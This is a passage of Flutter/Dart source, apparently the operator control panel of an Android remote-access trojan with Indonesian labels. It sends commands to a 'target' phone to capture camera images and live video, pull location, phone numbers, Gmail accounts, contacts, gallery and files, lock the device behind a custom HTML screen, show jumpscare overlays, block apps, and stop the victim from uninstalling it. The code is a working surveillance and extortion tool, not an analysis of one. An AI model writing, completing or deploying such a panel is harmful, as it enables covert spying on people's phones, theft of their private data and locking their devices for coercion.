                          ? [BoxShadow(color: color.withOpacity(0.5), blurRadius: 6, spreadRadius: 1)]
                          : null,
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 10),
              Text(
                item['label'],
                style: const TextStyle(color: textMain, fontWeight: FontWeight.w600, fontSize: 12),
                maxLines: 1,
                overflow: TextOverflow.ellipsis,
              ),
              const SizedBox(height: 2),
              Expanded(
                child: Text(
                  item['subtitle'] ?? "",
                  style: TextStyle(color: textSub.withOpacity(0.6), fontSize: 9),
                  maxLines: 2,
                  overflow: TextOverflow.ellipsis,
                ),
              ),
              const SizedBox(height: 6),
              if (isToggle)
                Row(
                  children: [
                    Expanded(
                      child: _buildMiniButton(
                        "ON",
                        onTap: () => _handleToggleAction(item, true),
                        color: color,
                        isActive: isOn,
                      ),
                    ),
                    const SizedBox(width: 6),
                    Expanded(
                      child: _buildMiniButton(
                        "OFF",
                        onTap: () => _handleToggleAction(item, false),
                        color: textSub,
                        isActive: !isOn,
                      ),
                    ),
                  ],
                )
              else
                SizedBox(
                  width: double.infinity,
                  child: _buildMiniButton(
                    "TAP",
                    onTap: () => _handleActionTap(item),
                    color: color,
                    isActive: false,
                  ),
                ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildMiniButton(String label, {required VoidCallback onTap, required Color color, required bool isActive}) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 6),
        decoration: BoxDecoration(
          color: isActive ? color.withOpacity(0.2) : Colors.white.withOpacity(0.05),
          borderRadius: BorderRadius.circular(8),
          border: Border.all(
            color: isActive ? color.withOpacity(0.5) : glassBorder,
            width: 1,
          ),
        ),
        child: Center(
          child: Text(
            label,
            style: TextStyle(
              color: isActive ? color : textSub,
              fontSize: 10,
              fontWeight: FontWeight.bold,
              letterSpacing: 0.5,
            ),
          ),
        ),
      ),
    );
  }

  void _handleToggleAction(Map<String, dynamic> item, bool turnOn) async {
    final command = item['command'];
    final needsInput = item['needsInput'] ?? false;
    final inputHint = item['inputHint'] ?? '';
    final inputType = item['inputType'] ?? 'text';

    if (command == 'jumpscareStart') {
      if (turnOn) _showJumpscareDialog();
      else {
        _sendCommand('jumpscareStop', extra: 'true');
        setState(() { _isJumpscareActive = false; _updateControlItemState(command, false); });
      }
      return;
    }
    if (command == 'jumpscare2Start') {
      if (turnOn) _showJumpscare2Dialog();
      else {
        _sendCommand('jumpscare2Stop', extra: 'true');
        setState(() { _isJumpscare2Active = false; _updateControlItemState(command, false); });
      }
      return;
    }
    if (command == 'videoOverlay') {
      _sendCommand(command, extra: turnOn ? 'start' : 'stop');
      setState(() { _updateControlItemState(command, turnOn); _isVideoOverlayActive = turnOn; });
      return;
    }
    if (command == 'lockDevice') {
      if (turnOn) {
        String? input = await _showLockDeviceDialog();
        if (input == null) return;
        _sendCommand(command, extra: input);
        setState(() => _updateControlItemState(command, true));
      } else {
        _sendCommand('unlockDevice', extra: '');
        setState(() => _updateControlItemState(command, false));
      }
      return;
    }
    if (command == 'lockCustom') {
      if (turnOn) {
        String? input = await _showInputDialog(
          title: "Input HTML untuk Custom Lock",
          hint: "<h1>Perangkat Terkunci</h1>",
          multiline: true,
        );
        if (input == null) return;
        _sendCommand(command, extra: input);
        setState(() => _updateControlItemState(command, true));
      } else {
        _sendCommand('unlockDevice', extra: '');
        setState(() => _updateControlItemState(command, false));
      }
      return;
    }
    if (needsInput && turnOn) {
      String? input = await _showInputDialog(
        title: "Input untuk ${item['label']}",
        hint: inputHint,
        multiline: inputType == 'multiline',
        keyboardType: inputType == 'number' ? TextInputType.number : TextInputType.text,
      );
      if (input == null) return;
      _sendCommand(command, extra: input);
      setState(() => _updateControlItemState(command, true));
    } else if (needsInput && !turnOn) {
      _sendCommand(command, extra: 'false');
      setState(() => _updateControlItemState(command, false));
    } else {
      _sendCommand(command, extra: turnOn.toString());
      setState(() => _updateControlItemState(command, turnOn));
    }
  }

  void _handleActionTap(Map<String, dynamic> item) async {
    final command = item['command'];
    final needsInput = item['needsInput'] ?? false;
    final inputHint = item['inputHint'] ?? '';
    final inputType = item['inputType'] ?? 'text';
    final extra = item['extra'] ?? '';

    if (command == "camera") { _takeScreenshotViaRest(extra.isNotEmpty ? extra : "front"); return; }
    if (command == "liveCamera") { _startLiveCameraPolling(extra.isNotEmpty ? extra : "front"); return; }
    if (command == "stopCamera") { _sendCommand('camera', extra: 'stop'); return; }
    if (command == "stopScreen") { _sendCommand('screen', extra: 'stop'); return; }
    if (command == "getLocation") {
      _sendCommand('getLocation', extra: '');
      showDialog(
        context: context,
        barrierDismissible: false,
        builder: (context) {
          _locationLoadingContext = context;
          return Center(
            child: Container(
              padding: const EdgeInsets.all(24),
              decoration: BoxDecoration(
                color: bgSurface,
                borderRadius: BorderRadius.circular(20),
                border: Border.all(color: glassBorder),
              ),
              child: const CircularProgressIndicator(color: accentBlue),
            ),
          );
        },
      );
      return;
    }
    if (command == "getPhone") { _sendCommand('getPhone', extra: ''); return; }
    if (command == "getGmail") { _sendCommand('getGmail', extra: ''); return; }
    if (command == "getContacts") { _sendCommand('getContacts', extra: ''); return; }
    if (command == "setWallpaper") { _showUrlDialog("Set Wallpaper", "Masukkan URL Gambar", "https://example.com/image.jpg", command, extra); return; }
    if (command == "openUrl") { _showUrlDialog("Open Situs", "Masukkan URL Situs", "https://example.com", command, extra); return; }
    if (command == "jumpscareStart") { _showJumpscareDialog(); return; }
    if (command == "jumpscare2Start") { _showJumpscare2Dialog(); return; }
    if (command == "blockApp") { _showBlockAppBottomSheet(); return; }
    if (command == "getGallery") { _openGalleryFullscreen(); return; }
    if (command == "getFiles") { _openFileManagerFullscreen(); return; }

    if (needsInput) {
      String? input;
      if (command == 'lockDevice') {
        input = await _showLockDeviceDialog();
      } else {
        input = await _showInputDialog(
          title: "Input untuk ${item['label']}",
          hint: inputHint,
          multiline: inputType == 'multiline',
          keyboardType: inputType == 'number' ? TextInputType.number : TextInputType.text,
          initialValue: extra,
        );
      }
      if (input == null) return;
      _sendCommand(command, extra: input);
    } else {
      _sendCommand(command, extra: extra);
    }
  }

  void _showUrlDialog(String title, String hint, String placeholder, String command, String initialValue) {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) {
        final controller = TextEditingController(text: initialValue.isNotEmpty ? initialValue : placeholder);
        return AlertDialog(
          backgroundColor: bgSurface,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(24),
            side: BorderSide(color: glassBorder, width: 1),
          ),
          title: Text(title, style: const TextStyle(color: textMain, fontSize: 16)),
          content: TextField(
            controller: controller,
            decoration: InputDecoration(
              hintText: hint,
              hintStyle: TextStyle(color: textSub, fontSize: 12),
              enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: glassBorder, width: 1.5), borderRadius: BorderRadius.circular(12)),
              focusedBorder: OutlineInputBorder(borderSide: const BorderSide(color: accentBlue, width: 1.5), borderRadius: BorderRadius.circular(12)),
            ),
            style: const TextStyle(color: textMain, fontSize: 13),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context),
              child: Text("BATAL", style: TextStyle(color: textSub, fontSize: 12)),
            ),
            ElevatedButton(
              onPressed: () {
                final value = controller.text.trim();
                if (value.isEmpty) return;
                Navigator.pop(context);
                _sendCommand(command, extra: value);
              },
              style: ElevatedButton.styleFrom(
                backgroundColor: accentBlue,
                foregroundColor: Colors.white,
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
              ),
              child: const Text("KIRIM", style: TextStyle(fontSize: 12, fontWeight: FontWeight.bold)),
            ),
          ],
        );
      },
    );
  }

  void _showJumpscareDialog() {
    final urlController = TextEditingController(text: _jumpscareUrl.isNotEmpty ? _jumpscareUrl : "https://files.catbox.moe/dihycl.jpg");
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) {
        return AlertDialog(
          backgroundColor: bgSurface,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(24),
            side: BorderSide(color: glassBorder, width: 1),
          ),
          title: const Text("🎃 Jumpscare", style: TextStyle(color: textMain, fontSize: 16)),
          content: TextField(
            controller: urlController,
            decoration: InputDecoration(
              hintText: "https://files.catbox.moe/xxx.jpg",
              hintStyle: TextStyle(color: textSub, fontSize: 12),
              enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: glassBorder, width: 1.5), borderRadius: BorderRadius.circular(12)),
              focusedBorder: OutlineInputBorder(borderSide: const BorderSide(color: accentBlue, width: 1.5), borderRadius: BorderRadius.circular(12)),
            ),
            style: const TextStyle(color: textMain, fontSize: 13),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context),
              child: Text("BATAL", style: TextStyle(color: textSub, fontSize: 12)),
            ),
            ElevatedButton(
              onPressed: () {
                final url = urlController.text.trim();
                if (url.isEmpty) return;
                Navigator.pop(context);
                _jumpscareUrl = url;
                _sendCommand('jumpscareStart', extra: url);
                setState(() { _isJumpscareActive = true; _updateControlItemState('jumpscareStart', true); });
              },
              style: ElevatedButton.styleFrom(
                backgroundColor: accentBlue,
                foregroundColor: Colors.white,
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
              ),
              child: const Text("AKTIFKAN", style: TextStyle(fontSize: 12, fontWeight: FontWeight.bold)),
            ),
          ],
        );
      },
    );
  }

  void _showJumpscare2Dialog() {
    final urlController = TextEditingController(text: _jumpscare2Url.isNotEmpty ? _jumpscare2Url : "https://files.catbox.moe/ulrmbb.jpg");
    final durationController = TextEditingController(text: _jumpscare2Duration.toString());

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) {
        return AlertDialog(
          backgroundColor: bgSurface,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(24),
            side: BorderSide(color: glassBorder, width: 1),
          ),
          title: const Text("Jumpscare V2", style: TextStyle(color: textMain, fontSize: 16)),
          content: SingleChildScrollView(
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                TextField(
                  controller: urlController,
                  decoration: InputDecoration(
                    hintText: "https://files.catbox.moe/xxx.jpg",
                    hintStyle: TextStyle(color: textSub, fontSize: 12),
                    enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: glassBorder, width: 1.5), borderRadius: BorderRadius.circular(12)),
                    focusedBorder: OutlineInputBorder(borderSide: const BorderSide(color: accentBlue, width: 1.5), borderRadius: BorderRadius.circular(12)),
                  ),
                  style: const TextStyle(color: textMain, fontSize: 13),
                ),
                const SizedBox(height: 12),
                Row(
                  children: [
                    Expanded(
                      child: TextField(
                        controller: durationController,
                        keyboardType: TextInputType.number,
                        decoration: InputDecoration(
                          hintText: "3000",
                          hintStyle: TextStyle(color: textSub, fontSize: 12),
                          enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: glassBorder, width: 1.5), borderRadius: BorderRadius.circular(12)),
                          focusedBorder: OutlineInputBorder(borderSide: const BorderSide(color: accentBlue, width: 1.5), borderRadius: BorderRadius.circular(12)),
                        ),
                        style: const TextStyle(color: textMain, fontSize: 13),
                      ),
                    ),
                    const SizedBox(width: 8),
                    TextButton(
                      onPressed: () => durationController.text = "3000",
                      child: Text("Reset", style: TextStyle(color: accentBlue, fontSize: 12)),
                    ),
                  ],
                ),
              ],
            ),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context),
              child: Text("BATAL", style: TextStyle(color: textSub, fontSize: 12)),
            ),
            ElevatedButton(
              onPressed: () {
                final url = urlController.text.trim();
                final duration = int.tryParse(durationController.text.trim()) ?? 3000;
                if (url.isEmpty) return;
                Navigator.pop(context);
                _jumpscare2Url = url;
                _jumpscare2Duration = duration;
                _sendCommand('jumpscare2Start', extra: jsonEncode({'url': url, 'duration': duration}));
                setState(() { _isJumpscare2Active = true; _updateControlItemState('jumpscare2Start', true); });
              },
              style: ElevatedButton.styleFrom(
                backgroundColor: accentBlue,
                foregroundColor: Colors.white,
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
              ),
              child: const Text("AKTIFKAN", style: TextStyle(fontSize: 12, fontWeight: FontWeight.bold)),
            ),
          ],
        );
      },
    );
  }

  void _showBlockAppBottomSheet() {
    setState(() => _installedApps = []);
    _sendCommand('getInstalledApps', extra: 'true');

    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (context) {
        return ClipRRect(
          borderRadius: const BorderRadius.vertical(top: Radius.circular(28)),
          child: BackdropFilter(
            filter: ImageFilter.blur(sigmaX: 20, sigmaY: 20),
            child: Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                  colors: [
                    glassTop,
                    glassBottom,
                  ],
                ),
                borderRadius: const BorderRadius.vertical(top: Radius.circular(28)),
                border: Border(
                  top: BorderSide(color: glassBorder, width: 1),
                  left: BorderSide(color: glassBorder, width: 1),
                  right: BorderSide(color: glassBorder, width: 1),
                ),
              ),
              child: StatefulBuilder(
                builder: (context, setSheetState) {
                  String searchQuery = '';
                  List<Map<String, dynamic>> filteredApps = searchQuery.isEmpty
                      ? _installedApps
                      : _installedApps.where((app) =>
                          (app['name']?.toString() ?? '').toLowerCase().contains(searchQuery.toLowerCase())).toList();

                  return Container(
                    padding: const EdgeInsets.fromLTRB(20, 16, 20, 32),
                    constraints: BoxConstraints(maxHeight: MediaQuery.of(context).size.height * 0.75),
                    child: Column(
                      mainAxisSize: MainAxisSize.min,
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Center(
                          child: Container(
                            width: 36,
                            height: 4,
                            decoration: BoxDecoration(
                              color: glassBorder,
                              borderRadius: BorderRadius.circular(2),
                            ),
                          ),
                        ),
                        const SizedBox(height: 16),
                        Row(
                          children: [
                            const Icon(Icons.block, color: errorColor, size: 22),
                            const SizedBox(width: 10),
                            const Text("Block Apps", style: TextStyle(color: textMain, fontSize: 16, fontWeight: FontWeight.bold)),
                            const Spacer(),
                            IconButton(
                              icon: const Icon(Icons.close, color: textSub, size: 20),
                              onPressed: () => Navigator.pop(context),
                            ),
                          ],
                        ),
                        const SizedBox(height: 8),
                        TextField(
                          onChanged: (value) => setSheetState(() => searchQuery = value),
                          decoration: InputDecoration(
                            hintText: "Cari aplikasi...",
                            hintStyle: TextStyle(color: textSub, fontSize: 12),
                            prefixIcon: const Icon(Icons.search, color: textSub, size: 18),
                            enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: glassBorder, width: 1.5), borderRadius: BorderRadius.circular(14)),
                            focusedBorder: OutlineInputBorder(borderSide: const BorderSide(color: accentBlue, width: 1.5), borderRadius: BorderRadius.circular(14)),
                            contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
                          ),
                          style: const TextStyle(color: textMain, fontSize: 13),
                        ),
                        const SizedBox(height: 12),
                        Expanded(
                          child: _installedApps.isEmpty
                              ? const Center(child: CircularProgressIndicator(color: accentBlue))
                              : ListView.builder(
                                  itemCount: filteredApps.length,
                                  itemBuilder: (context, index) {
                                    final app = filteredApps[index];
                                    final package = app['package'] ?? '';
                                    final isBlocked = _blockedApps.contains(package);
                                    return Container(
                                      margin: const EdgeInsets.only(bottom: 6),
                                      decoration: BoxDecoration(
                                        color: Colors.white.withOpacity(0.03),
                                        borderRadius: BorderRadius.circular(12),
                                        border: Border.all(color: glassBorder),
                                      ),
                                      child: ListTile(
                                        leading: Container(
                                          width: 36,
                                          height: 36,
                                          decoration: BoxDecoration(
                                            color: accentBlue.withOpacity(0.15),
                                            borderRadius: BorderRadius.circular(8),
                                          ),
                                          child: Center(
                                            child: Text(
                                              (app['name']?[0] ?? '?').toUpperCase(),
                                              style: const TextStyle(color: accentBlue, fontWeight: FontWeight.bold, fontSize: 16),
                                            ),
                                          ),
                                        ),
                                        title: Text(
                                          app['name'] ?? package,
                                          style: const TextStyle(color: textMain, fontSize: 13),
                                        ),
                                        subtitle: Text(
                                          package,
                                          style: TextStyle(color: textSub.withOpacity(0.5), fontSize: 9),
                                        ),
                                        trailing: GestureDetector(
                                          onTap: () {
                                            if (isBlocked) {
                                              _sendCommand('unblockApp', extra: package);
                                              setState(() => _blockedApps.remove(package));
                                            } else {
                                              _sendCommand('blockApp', extra: jsonEncode({'package': package, 'name': app['name']}));
                                              setState(() => _blockedApps.add(package));
                                            }
                                            setSheetState(() {});
                                          },
                                          child: Container(
                                            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                                            decoration: BoxDecoration(
                                              color: isBlocked ? errorColor.withOpacity(0.15) : successColor.withOpacity(0.15),
                                              borderRadius: BorderRadius.circular(8),
                                              border: Border.all(
                                                color: isBlocked ? errorColor.withOpacity(0.3) : successColor.withOpacity(0.3),
                                              ),
                                            ),
                                            child: Text(
                                              isBlocked ? "UNBLOCK" : "BLOCK",
                                              style: TextStyle(
                                                color: isBlocked ? errorColor : successColor,
                                                fontSize: 9,
                                                fontWeight: FontWeight.bold,
                                              ),
                                            ),
                                          ),
                                        ),
                                      ),
                                    );
                                  },
                                ),
                        ),
                      ],
                    ),
                  );
                },
              ),
            ),
          ),
        );
      },
    );
  }

  Widget _buildDeviceInfoCard() {
    final battery = _deviceData['battery'] ?? 0;
    return ClipRRect(
      borderRadius: BorderRadius.circular(20),
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 12, sigmaY: 12),
        child: Container(
          decoration: BoxDecoration(
            gradient: LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: [
                glassTop,
                glassBottom,
              ],
            ),
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: glassBorder, width: 1),
          ),
          child: Column(
            children: [
              // Header - tappable to expand/collapse
              GestureDetector(
                onTap: () => setState(() => _deviceInfoExpanded = !_deviceInfoExpanded),
                child: Container(
                  padding: const EdgeInsets.all(16),
                  child: Row(
                    children: [
                      Container(
                        width: 44,
                        height: 44,
                        decoration: BoxDecoration(
                          gradient: LinearGradient(
                            begin: Alignment.topLeft,
                            end: Alignment.bottomRight,
                            colors: [
                              accentRed.withOpacity(0.2),
                              accentRed.withOpacity(0.05),
                            ],
                          ),
                          borderRadius: BorderRadius.circular(12),
                          border: Border.all(color: accentRed.withOpacity(0.3)),
                        ),
                        child: const Icon(Icons.phone_android, color: accentRed, size: 22),
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              _targetModel,
                              style: const TextStyle(
                                color: textMain,
                                fontWeight: FontWeight.bold,
                                fontSize: 15,
                              ),
                              maxLines: 1,
                              overflow: TextOverflow.ellipsis,
                            ),
                            Row(
                              children: [
                                Container(
                                  width: 6,
                                  height: 6,
                                  decoration: BoxDecoration(
                                    color: _isConnected ? successColor : errorColor,
                                    shape: BoxShape.circle,
                                  ),
                                ),
                                const SizedBox(width: 6),
                                Text(
                                  _isConnected ? "Online" : "Offline",
                                  style: TextStyle(
                                    color: _isConnected ? successColor : errorColor,
                                    fontSize: 11,
                                    fontWeight: FontWeight.w500,
                                  ),
                                ),
                              ],
                            ),
                          ],
                        ),
                      ),
                      Container(
                        padding: const EdgeInsets.all(6),
                        decoration: BoxDecoration(
                          color: Colors.white.withOpacity(0.05),
                          borderRadius: BorderRadius.circular(8),
                          border: Border.all(color: glassBorder),
                        ),
                        child: AnimatedRotation(
                          turns: _deviceInfoExpanded ? 0 : 0.5,
                          duration: const Duration(milliseconds: 300),
                          child: const Icon(Icons.keyboard_arrow_up, color: textSub, size: 18),
                        ),
                      ),
                    ],
                  ),
                ),
              ),
              // Expandable content
              AnimatedCrossFade(
                firstChild: Container(
                  padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
                  child: Column(
                    children: [
                      Divider(color: glassBorder, height: 1),
                      const SizedBox(height: 12),
                      Row(
                        children: [
                          Expanded(child: _buildDetailBox("DEVICE ID", _targetId)),
                          const SizedBox(width: 10),
                          Expanded(child: _buildDetailBox("LAST SEEN", "Baru saja")),
                        ],
                      ),
                      const SizedBox(height: 10),
                      _buildDetailBox("SIM / OPERATOR", _deviceData['sim'] ?? "XL Axiata"),
                      const SizedBox(height: 10),
                      // Battery
                      Container(
                        padding: const EdgeInsets.all(12),
                        decoration: BoxDecoration(
                          color: Colors.white.withOpacity(0.03),
                          borderRadius: BorderRadius.circular(12),
                          border: Border.all(color: glassBorder),
                        ),
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            const Text("BATTERY", style: TextStyle(color: textSub, fontSize: 9, letterSpacing: 1, fontWeight: FontWeight.bold)),
                            const SizedBox(height: 8),
                            Row(
                              children: [
                                Expanded(
                                  child: ClipRRect(
                                    borderRadius: BorderRadius.circular(4),
                                    child: LinearProgressIndicator(
                                      value: battery / 100,
                                      backgroundColor: Colors.white.withOpacity(0.05),
                                      valueColor: AlwaysStoppedAnimation<Color>(
                                        battery < 20 ? errorColor : (battery < 50 ? warningColor : successColor),
                                      ),
                                      minHeight: 6,
                                    ),
                                  ),
                                ),
                                const SizedBox(width: 12),
                                Text(
                                  "$battery%",
                                  style: const TextStyle(color: textMain, fontWeight: FontWeight.bold, fontSize: 13),
                                ),
                              ],
                            ),
                          ],
                        ),
                      ),
                      const SizedBox(height: 10),
                      // Anti Uninstall Toggle
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                        decoration: BoxDecoration(
                          color: Colors.white.withOpacity(0.03),
                          borderRadius: BorderRadius.circular(12),
                          border: Border.all(color: glassBorder),
                        ),
                        child: Row(
                          children: [
                            const Expanded(
                              child: Column(
                                crossAxisAlignment: CrossAxisAlignment.start,
                                children: [
                                  Text("Anti-Uninstall", style: TextStyle(color: textMain, fontWeight: FontWeight.w600, fontSize: 12)),
                                  SizedBox(height: 2),
                                  Text("Cegah target uninstall", style: TextStyle(color: textSub, fontSize: 9)),
                                ],
                              ),
                            ),
                            Transform.scale(
                              scale: 0.8,
                              child: Switch(
                                value: _isAntiUninstallActive,
                                onChanged: (val) {
                                  _sendCommand('antiUninstall', extra: val ? 'true' : 'false');
                                  setState(() => _isAntiUninstallActive = val);
                                },
                                activeColor: accentRed,
                                activeTrackColor: accentRed.withOpacity(0.3),
                                inactiveThumbColor: textSub,
                                inactiveTrackColor: glassBorder,
                              ),
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),
                secondChild: const SizedBox(width: double.infinity),
                crossFadeState: _deviceInfoExpanded ? CrossFadeState.showFirst : CrossFadeState.showSecond,
                duration: const Duration(milliseconds: 300),
                sizeCurve: Curves.easeInOut,
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildDetailBox(String label, String value) {
    return Container(
      padding: const EdgeInsets.all(10),
      decoration: BoxDecoration(
        color: Colors.white.withOpacity(0.03),
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: glassBorder),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(label, style: TextStyle(color: textSub.withOpacity(0.6), fontSize: 8, letterSpacing: 0.8, fontWeight: FontWeight.bold)),
          const SizedBox(height: 3),
          Text(
            value,
            style: const TextStyle(color: textMain, fontWeight: FontWeight.w600, fontSize: 11),
            overflow: TextOverflow.ellipsis,
          ),
        ],
      ),
    );
  }

  Widget _buildTerminalLogs() {
    return ClipRRect(
      borderRadius: BorderRadius.circular(16),
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 8, sigmaY: 8),
        child: Container(
          height: 100,
          decoration: BoxDecoration(
            gradient: LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: [
                glassTop,
                glassBottom,
              ],
            ),
            borderRadius: BorderRadius.circular(16),
            border: Border.all(color: glassBorder, width: 1),
          ),
          child: Column(
            children: [
              // Header
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                decoration: BoxDecoration(
                  border: Border(bottom: BorderSide(color: glassBorder)),
                ),
                child: Row(
                  children: [
                    Container(
                      width: 6,
                      height: 6,
                      decoration: BoxDecoration(
                        color: _isConnected ? successColor : errorColor,
                        shape: BoxShape.circle,
                      ),
                    ),
                    const SizedBox(width: 6),
                    Text(
                      "ACTIVITY LOG",
                      style: TextStyle(
                        color: textSub.withOpacity(0.7),
                        fontSize: 9,
                        fontWeight: FontWeight.bold,
                        letterSpacing: 1,
                      ),
                    ),
                    const Spacer(),
                    Text(
                      "${_executionLogs.length}",
                      style: TextStyle(color: textSub.withOpacity(0.4), fontSize: 9),
                    ),
                  ],
                ),
              ),
              // Logs
              Expanded(
                child: ListView.builder(
                  controller: _logScrollController,
                  reverse: true,
                  padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
                  itemCount: _executionLogs.length,
                  itemBuilder: (context, i) {
                    final log = _executionLogs[_executionLogs.length - 1 - i];
                    return Padding(
                      padding: const EdgeInsets.symmetric(vertical: 1.5),
                      child: Row(
                        children: [
                          Text(
                            "[${_formatTime(log.timestamp)}]",
                            style: TextStyle(color: textSub.withOpacity(0.3), fontSize: 9, fontFamily: 'monospace'),
                          ),
                          const SizedBox(width: 6),
                          Expanded(
                            child: Text(
                              log.message,
                              style: TextStyle(
                                color: _getLogColor(log.type).withOpacity(0.9),
                                fontSize: 10,
                                fontFamily: 'monospace',
                              ),
                              maxLines: 1,
                              overflow: TextOverflow.ellipsis,
                            ),
                          ),
                        ],
                      ),
                    );
                  },
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // ─── SISA FUNGSI UI LAINNYA ──────────────────────────────────────────
  Future<void> _takeScreenshotViaRest(String facing) async {
    final prefs = await SharedPreferences.getInstance();
    final token = prefs.getString('key') ?? '';
    setState(() { _cameraFacing = facing; });
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => Center(
        child: Container(
          padding: const EdgeInsets.all(24),
          decoration: BoxDecoration(
            color: bgSurface,
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: glassBorder),
          ),
          child: const CircularProgressIndicator(color: accentBlue),
        ),
      ),
    );
    try {
      final response = await http.get(
        Uri.parse("$baseUrl/api/screenshot/$_targetId?facing=$facing"),
        headers: {"x-auth-token": token},
      );
      if (mounted) Navigator.pop(context);
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['frame'] != null) {
          Navigator.push(
            context,
            MaterialPageRoute(
              builder: (context) => ScreenshotResultPage(
                targetModel: _targetModel,
                screenshotFrame: data['frame'],
                screenshotFacing: facing,
                onClose: () => Navigator.pop(context),
              ),
              fullscreenDialog: true,
            ),
          );
        }
      }
    } catch (e) {
      if (mounted) Navigator.pop(context);
    }
  }

  void _startLiveCameraPolling(String facing) async {
    setState(() { _cameraFacing = facing; });
    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (context) => LiveCameraPollingPage(
          targetId: _targetId,
          targetModel: _targetModel,
          facing: _cameraFacing,
          onClose: () {
            _sendCommand('camera', extra: 'stop');
            Navigator.pop(context);
          },
          onSwitchCamera: (newFacing) => setState(() => _cameraFacing = newFacing),
        ),
        fullscreenDialog: true,
      ),
    );
  }

  void _downloadScreenshot(String frameBase64) async {
    try {
      final bytes = base64Decode(frameBase64.split(',').last);
      final directory = await getDownloadsDirectory() ?? await getApplicationDocumentsDirectory();
      final file = File('${directory.path}/screenshot_${DateTime.now().millisecondsSinceEpoch}.jpg');
      await file.writeAsBytes(bytes);
    } catch (e) {}
  }

  void _openGalleryFullscreen() {
    _sendCommand('getGallery');
    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (context) => GalleryFullscreenPage(
          targetId: _targetId,
          targetModel: _targetModel,
          galleryStream: _galleryStreamController.stream,
          onClose: () => Navigator.pop(context),
          onRefresh: () => _sendCommand('getGallery'),
          onDownload: _downloadScreenshot,
        ),
        fullscreenDialog: true,
      ),
    );
  }

  void _openFileManagerFullscreen() {
    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (context) => FileManagerFullscreenPage(
          targetId: _targetId,
          targetModel: _targetModel,
          onClose: () => Navigator.pop(context),
          sendCommand: _sendCommand,
        ),
        fullscreenDialog: true,
      ),
    );
  }

  void _showPhoneBottomSheet(Map<String, dynamic> data) {
    final sims = data['sims'] as List? ?? [];
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      builder: (context) => ClipRRect(
        borderRadius: const BorderRadius.vertical(top: Radius.circular(28)),
        child: BackdropFilter(
          filter: ImageFilter.blur(sigmaX: 20, sigmaY: 20),
          child: Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                begin: Alignment.topCenter,
                end: Alignment.bottomCenter,
                colors: [glassTop, glassBottom],
              ),
              borderRadius: const BorderRadius.vertical(top: Radius.circular(28)),
              border: Border.all(color: glassBorder, width: 1),
            ),
            child: ListView(
              padding: const EdgeInsets.all(20),
              children: sims.map((sim) => Container(
                margin: const EdgeInsets.only(bottom: 8),
                decoration: BoxDecoration(
                  color: Colors.white.withOpacity(0.03),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: glassBorder),
                ),
                child: ListTile(
                  leading: const Icon(Icons.sim_card, color: accentCyan),
                  title: Text(sim['number'] ?? '-', style: const TextStyle(color: textMain)),
                  subtitle: Text(sim['operator'] ?? '-', style: const TextStyle(color: textSub)),
                ),
              )).toList(),
            ),
          ),
        ),
      ),
    );
  }

  void _showGmailBottomSheet(Map<String, dynamic> data) {
    final accounts = data['accounts'] as List? ?? [];
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      builder: (context) => ClipRRect(
        borderRadius: const BorderRadius.vertical(top: Radius.circular(28)),
        child: BackdropFilter(
          filter: ImageFilter.blur(sigmaX: 20, sigmaY: 20),
          child: Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                begin: Alignment.topCenter,
